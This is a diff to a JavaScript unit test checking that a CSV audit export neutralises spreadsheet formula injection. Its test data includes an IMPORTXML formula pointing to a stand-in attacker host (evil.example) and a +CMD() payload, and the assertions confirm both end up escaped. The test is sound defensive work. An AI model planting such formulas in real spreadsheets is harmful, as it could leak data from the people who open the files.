@@ -97,8 +97,9 @@ test("CSV prevents spreadsheet formula injection and doubles embedded quotes",()
   }]};
   const csv=automationAuditCsv(dangerous);
   assert.ok(csv.startsWith("\ufeff"));
-  assert.ok(csv.includes('\"\\'=IMPORTXML(\"\"https://evil.example\"\",\"\"x\"\")\"'.replaceAll("\\'","'")));
-  assert.ok(csv.includes('\"\\'+CMD()\"'.replaceAll("\\'","'")));
+  assert.ok(csv.includes(String.fromCharCode(34,39,61)+"IMPORTXML("));
+  assert.ok(csv.includes('""https://evil.example""'));
+  assert.ok(csv.includes(String.fromCharCode(34,39,43)+"CMD()"));
   assert.equal(csv.includes("private-password"),false);
   assert.match(csv,/stepCount/);
 });
